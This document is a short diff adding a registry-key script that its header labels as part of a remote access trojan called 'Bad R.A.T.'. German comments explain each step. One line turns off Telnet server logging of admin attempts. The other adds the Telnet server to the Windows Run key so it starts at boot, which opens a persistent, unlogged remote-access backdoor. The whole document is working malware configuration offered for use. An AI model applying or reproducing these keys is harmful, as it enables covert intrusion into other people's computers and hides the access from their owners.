@@ -1,0 +1,8 @@
+;Reg Keys for [Bad R.A.T.]
+;by Mr Hawk
+;www.bad-rat.de.vu
+
+;Loggen verhindern
+RegAdd HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\TelnetServer\1.0,LogAdminAttempts,0
+;Telnet-Server beim Systemstart laden
+RegAdd HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Telnet,%windir%\System32\tlntsvr.exe
